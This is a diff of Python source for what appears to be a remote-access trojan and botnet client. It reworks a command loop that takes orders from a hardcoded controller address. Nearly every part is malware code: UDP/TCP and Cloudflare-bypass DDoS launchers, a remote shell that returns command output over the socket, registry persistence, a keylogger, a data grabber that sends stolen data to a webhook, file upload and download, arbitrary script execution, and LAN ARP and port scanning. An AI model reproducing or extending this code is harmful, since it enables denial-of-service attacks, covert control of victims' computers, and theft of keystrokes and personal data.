@@ -416,8 +416,8 @@ def network_scan():
         return clients
 
     def output_results(clients):
-        out = ""
-        for client in clients: out += f" {client['ip']} \t{client['mac']}\n"
+        out = "     \n\n  ------- Network Scan Results -------\n\n"
+        for client in clients: out += f" {client['ip']} \t\t{client['mac']}\n"
         return out
 
 
@@ -1749,7 +1749,7 @@ EXCLUDE_DIRECTORY = (
 ip      	= "192.168.0.2" 	# IP_HERE
 port_    	= "1888"			# PORT_HERE
 
-
+global blocked_process
 blocked_process = []
 maxthreads      = 50
 port            = int(port_)
@@ -1810,13 +1810,17 @@ class Client():
     def _shell_run(self, commands):
         global status
         status = None
-        instruction = commands
         def shell(command):
-            output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            global status
-            status = "ok"
-            return output.stdout.decode('CP437').strip()
-        out = shell(instruction)
+            stream = os.popen(f'{command}')
+            output = stream.read()
+            return output
+        # def shell(command):
+        #     output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        #     global status
+        #     status = "ok"
+        #     return output.stdout.decode('CP437').strip()
+        out = shell(commands)
+        if out == "": out = "Command executed successfully"
         self.sock.send(str.encode(out))
         status = None
 
@@ -1931,197 +1935,9 @@ class Client():
     def start(self):
         while True:
             data = self._recv()
-            
-            if "attack" in data:
-                try:
-                    data=data.replace("attack ","").split()
-                    method = str(data[0]).lower()
-                    target = data[1]
-                    por_t = data[2]
-                    thread = data[3]
-                    t = data[4]
 
-                    self.sock.send(str.encode("Attack Started!"))
-
-                    if method == "udp":
-                        threading.Thread(target=runsender, args=(target, por_t, t, thread)).start()
-                    
-                    elif method == "tcp":
-                        threading.Thread(target=runflooder, args=(target, por_t, t, thread)).start()
-
-                except: pass
-
-            elif "persistance" in data:
-                try:
-                    data=data.replace("persistance ","").split()
-                    registry_name = data[0]
-                    if self.persistance(registry_name): self.sock.send(str.encode("Persistance Successful!"))
-                    else: self.sock.send(str.encode("Persistance Failed!"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "scanfiles" in data:
-                try:
-                    data = data.replace("scanfiles ","").split()
-                    self.scan_files(data)
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "processcontrol" in data:
-                try:
-                    global blocked_process
-                    data = data.replace("processcontrol ","").split()
-                    blocked_process += data
-                    threading.Thread(target=process_control, args=(6969,)).start()
-                    self.sock.send(f"Process Control Enabled".encode("ascii"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "ddos" in data:
-                try:
-                    data=data.replace("ddos ","").split()
-                    method = str(data[0]).lower()
-                    target = data[1]
-                    thread = data[2]
-                    t = data[3]
-
-                    self.sock.send(str.encode("Attack Started!"))
-
-                    if method == "cfb":
-                        LaunchCFB(target, thread, t)
-                    
-                    elif method == "pxcfb":
-                        if get_proxies():
-                            LaunchPXCFB(target, thread, t, proxies)
-                    
-                    elif method == "cfreq":
-                        if get_cookie(target):
-                            LaunchCFPRO(target, thread, t)
-                    
-                    elif method == "cfsoc":
-                        if get_cookie(target):
-                            LaunchCFSOC(target, thread, t)
-
-
-                except: pass
-
-            elif "root" in data:
-                try:
-                    data = data.replace("root ","").split()
-                    commands = str(data[0])
-
-                    self._shell_run(commands)
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "portscan" in data:
-                try:
-                    data = data.replace("pscan ","").split()
-                    ipp = data[0]
-                    starting_port = int(data[1])
-                    ending_port = int(data[2])
-                    thread_amount = int(data[3])
-
-                    def _portscanner(ipp, starting_port, ending_port, thread_amount):
-                        target = ipp
-                        queue = Queue()
-                        open_ports = []
-
-                        def portscan(port):
-                            try:
-                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                sock.connect((target, port))
-                                return True
-                            except:
-                                return False
-
-                        def get_ports(starting_port, ending_port): 
-                            for port in range(starting_port, ending_port): queue.put(port)
-                            
-                        def worker():
-                            while not queue.empty():
-                                port = queue.get()
-                                if portscan(port): open_ports.append(port)
-
-                        def run_scanner(thread_amount, starting_port, ending_port):
-
-                            get_ports(starting_port, ending_port)
-                            thread_list = []
-
-                            for t in range(thread_amount):
-                                thread = threading.Thread(target=worker)
-                                thread_list.append(thread)
-
-                            for thread in thread_list: 
-                                thread.start()
-                            for thread in thread_list: 
-                                thread.join()
-
-                            return open_ports
-
-
-                        return run_scanner(thread_amount, starting_port, ending_port)
-                    
-                    self.sock.send(str.encode(f"{ipp}  Open ports are: {_portscanner(ipp, starting_port, ending_port, thread_amount)}"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "admincheck" in data:
-                try: self.sock.send(str.encode("Admin privileges")) if self.is_admin == True else self.sock.send(str.encode("NO Admin privileges"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "keylogger" in data:
-                try: 
-                    data = data.replace("keylogger ","").split()
-                    intervals = int(data[0])
-                    reciever = str(data[1])
-
-                    threading.Thread(target=Keylogger(intervals, reciever).start).start()
-                    self.sock.send(str.encode(f"Keylogger started"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "download" in data:
-                try:
-                    data = data.replace("download ","").split()
-                    dir = str(data[0])
-                    out = self.download(dir)
-                    self.sock.send(str.encode(f"Download file: " + out))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "upload" in data:
-                try:
-                    data = data.replace("upload ","").split()
-                    dir = str(data[0])
-                    out = self.upload(dir)
-                    self.sock.send(str.encode(f"File Uploaded: " + out))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "datagrabber" in data:
-                try:
-                    data = data.replace("datagrabber ","").split()
-                    webhook___ = str(data[0])
-
-                    # run datagrabber thread
-                    threading.Thread(target=start_datagrabber, args=(webhook___, )).start()
-                    self.sock.send(str.encode("Datagrabber Running"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "runscript" in data:
-                try:
-                    data = data.replace("runscript ","").split()
-                    name_   = str(data[0])
-                    type_   = str(data[1])
-                    s_code  = data[2:]
-                    code_   = " ".join(s_code)
-
-                    threading.Thread(target=self.execute_script, args=(name_, type_, code_, )).start()
-                    self.sock.send("Script executed".encode("ascii"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "stress" in data:
-                try:
-                    data    = data.replace("stress ","").split()
-                    time    = int(data[0])
-                    tasks   = int(data[1])
-
-                    threading.Thread(target=start_stresser, args=(time, tasks, )).start()
-                    self.sock.send(str.encode("Stressing target for " + str(time) + " seconds" + " with " + str(tasks) + " tasks"))
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+            if data == "ping":
+                self.sock.send(str.encode(f"pong"))
 
             elif data == "stopprocessscontrol":
                 try:
@@ -2194,7 +2010,7 @@ class Client():
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif data == "networkscan":
-                try: self.sock.send(f"{self.public_ip}    {network_scan()}".encode("ascii"))
+                try: self.sock.send(f"{network_scan()}".encode("ascii"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif data == "jigglecursor":
@@ -2209,8 +2025,210 @@ class Client():
                     self.sock.send(str.encode("Jiggling Cursor Disabled"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
-            elif data == "ping":
-                self.sock.send(str.encode(f"pong"))
+            elif "attack" in data:
+                try:
+                    data=data.replace("attack ","").split()
+                    method = str(data[0]).lower()
+                    target = data[1]
+                    por_t = data[2]
+                    thread = data[3]
+                    t = data[4]
+
+                    self.sock.send(str.encode("Attack Started!"))
+
+                    if method == "udp":
+                        threading.Thread(target=runsender, args=(target, por_t, t, thread)).start()
+                    
+                    elif method == "tcp":
+                        threading.Thread(target=runflooder, args=(target, por_t, t, thread)).start()
+
+                except: pass
+
+            elif "ddos" in data:
+                try:
+                    data=data.replace("ddos ","").split()
+                    method = str(data[0]).lower()
+                    target = data[1]
+                    thread = data[2]
+                    t = data[3]
+
+                    self.sock.send(str.encode("Attack Started!"))
+
+                    if method == "cfb":
+                        LaunchCFB(target, thread, t)
+                    
+                    elif method == "pxcfb":
+                        if get_proxies():
+                            LaunchPXCFB(target, thread, t, proxies)
+                    
+                    elif method == "cfreq":
+                        if get_cookie(target):
+                            LaunchCFPRO(target, thread, t)
+                    
+                    elif method == "cfsoc":
+                        if get_cookie(target):
+                            LaunchCFSOC(target, thread, t)
+
+
+                except: pass
+
+            elif "persistance" in data:
+                try:
+                    data=data.replace("persistance ","").split()
+                    registry_name = data[0]
+                    if self.persistance(registry_name): self.sock.send(str.encode("Persistance Successful!"))
+                    else: self.sock.send(str.encode("Persistance Failed!"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "scanfiles" in data:
+                try:
+                    data = data.replace("scanfiles ","").split()
+                    self.scan_files(data)
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "processcontrol" in data:
+                try:
+                    data = data.replace("processcontrol ","").split()
+                    blocked_process += data
+                    threading.Thread(target=process_control, args=(6969,)).start()
+                    self.sock.send(f"Process Control Enabled".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "root" in data:
+                try: commands = data.replace("root ","") ; self._shell_run(commands)
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "portscan" in data:
+                try:
+                    data = data.replace("portscan ","").split()
+                    starting_port = int(data[0])
+                    ending_port = int(data[1])
+                    thread_amount = int(data[2])
+
+                    def custom_scan():
+                        arp_request = ARP(pdst="192.168.0.1/24")
+                        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+                        arp_request_broadcast = broadcast/arp_request
+                        answerred, _ = srp(arp_request_broadcast, timeout=1, verbose=0)
+                        
+                        clients = []
+                        for element in answerred:
+                            clients.append({
+                                "ip": element[1].psrc,
+                        })
+                        return clients
+
+                    ips_to_scan = custom_scan()
+                    ports_ = ""
+
+                    def _portscanner(ipp, starting_port, ending_port, thread_amount):
+                        target = ipp
+                        queue = Queue()
+                        open_ports = []
+
+                        def portscan(port):
+                            try:
+                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                sock.connect((target, port))
+                                return True
+                            except:
+                                return False
+
+                        def get_ports(starting_port, ending_port): 
+                            for port in range(starting_port, ending_port): queue.put(port)
+                            
+                        def worker():
+                            while not queue.empty():
+                                port = queue.get()
+                                if portscan(port): open_ports.append(port)
+
+                        def run_scanner(thread_amount, starting_port, ending_port):
+
+                            get_ports(starting_port, ending_port)
+                            thread_list = []
+
+                            for t in range(thread_amount):
+                                thread = threading.Thread(target=worker)
+                                thread_list.append(thread)
+
+                            for thread in thread_list: 
+                                thread.start()
+                            for thread in thread_list: 
+                                thread.join()
+
+                            return open_ports
+
+
+                        return run_scanner(thread_amount, starting_port, ending_port)
+                    
+                    for ip in ips_to_scan:
+                        ports_ += f'\n{ip["ip"]} \t {_portscanner(ip["ip"], starting_port, ending_port, thread_amount)}\n\n'
+                    
+                    self.sock.send(f" {ports_}".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "admincheck" in data:
+                try: self.sock.send(str.encode("Admin privileges")) if self.is_admin == True else self.sock.send(str.encode("NO Admin privileges"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "keylogger" in data:
+                try: 
+                    data = data.replace("keylogger ","").split()
+                    intervals = int(data[0])
+                    reciever = str(data[1])
+
+                    threading.Thread(target=Keylogger(intervals, reciever).start).start()
+                    self.sock.send(str.encode(f"Keylogger started"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "download" in data:
+                try:
+                    data = data.replace("download ","").split()
+                    dir = str(data[0])
+                    out = self.download(dir)
+                    self.sock.send(str.encode(f"Download file: " + out))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "upload" in data:
+                try:
+                    data = data.replace("upload ","").split()
+                    dir = str(data[0])
+                    out = self.upload(dir)
+                    self.sock.send(str.encode(f"File Uploaded: " + out))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "datagrabber" in data:
+                try:
+                    data = data.replace("datagrabber ","").split()
+                    webhook___ = str(data[0])
+
+                    # run datagrabber thread
+                    threading.Thread(target=start_datagrabber, args=(webhook___, )).start()
+                    self.sock.send(str.encode("Datagrabber Running"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "runscript" in data:
+                try:
+                    data = data.replace("runscript ","").split()
+                    name_   = str(data[0])
+                    type_   = str(data[1])
+                    s_code  = data[2:]
+                    code_   = " ".join(s_code)
+
+                    threading.Thread(target=self.execute_script, args=(name_, type_, code_, )).start()
+                    self.sock.send("Script executed".encode("ascii"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "stress" in data:
+                try:
+                    data    = data.replace("stress ","").split()
+                    time    = int(data[0])
+                    tasks   = int(data[1])
+
+                    threading.Thread(target=start_stresser, args=(time, tasks, )).start()
+                    self.sock.send(str.encode("Stressing target for " + str(time) + " seconds" + " with " + str(tasks) + " tasks"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
 
             else: self.sock.send(str.encode("Invalid Command"))
 
